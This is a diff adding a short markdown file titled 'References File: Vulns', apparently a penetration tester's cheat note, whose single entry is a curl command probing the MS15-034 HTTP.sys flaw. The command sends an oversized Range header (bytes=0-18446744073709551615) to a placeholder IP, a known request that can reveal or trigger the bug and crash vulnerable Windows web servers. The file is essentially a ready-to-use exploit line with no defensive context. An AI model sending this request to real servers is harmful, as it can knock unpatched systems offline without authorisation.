@@ -1,0 +1,3 @@
+# References File: Vulns
+
+MS15_034: curl -v https://IP/ -H "Host: MS15_034" -H "Range: bytes=0-18446744073709551615" -k
